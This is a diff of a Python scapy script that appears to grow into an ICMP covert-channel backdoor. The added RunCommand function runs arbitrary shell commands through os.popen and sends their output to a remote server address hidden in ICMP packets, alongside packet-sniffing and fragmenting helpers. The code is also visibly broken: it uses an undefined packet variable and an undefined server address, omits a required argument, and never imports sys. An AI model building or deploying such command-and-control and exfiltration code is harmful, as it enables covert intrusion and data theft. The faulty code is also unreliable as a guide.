@@ -1,19 +1,36 @@
 import os
 from scapy.all import *
+import signal
 
-def pkt_send(source,dest,data):
-    sendp(IP(src=source,dst=dest)/ICMP()/data)
+from scapy.all import *
+import threading
 
-def sniff_pkt():
-    capture = sniff(filter="icmp or icmp[0]=8",count=1,prn=parse_packet)
-    print(capture)
 
-def parse_packet(packet):
-    if Raw in packet:
-        data_recieved = packet[Raw].load
-    print(data_recieved)
+def pkt_send(dest,data,icmp_type):
+        try:
+            frags=fragment(pkt,fragsize=1400)    # divide the packet into fragments if it's over 1400 bytes
+            for frg in frags:                    # by default, the router might send packets over 1500 bytes, which the computer cannot send forward
+                send(IP(dst=dest)/ICMP(type=icmp_type)/frg)                            # send each fragment independently
+        except:
+           print("failed to send in frags")
 
-  
-#pkt_send("10.1.0.104","10.1.0.173","yarin_believe in us")
-sniff_pkt()
+def sniff_pkt(pfilter,handler,cnt=30,timer=1000):
+    capture = sniff(filter=pfilter,count=cnt,prn=handler,timeout=timer)
+    
+def signal_handler(sig, frame):
+    print(' Exiting...')
+    sys.exit(0)
+    
+def extract_data(packet):
+    try:
+        return packet[0][Raw].load.decode('utf-8')
+    except:
+        return str(None)
+    
+def RunCommand(cmd):
+    output_stream = os.popen(cmd)
+    pkt_send(dest=server_adr,data=output_stream.read())
+
+    
+    
     
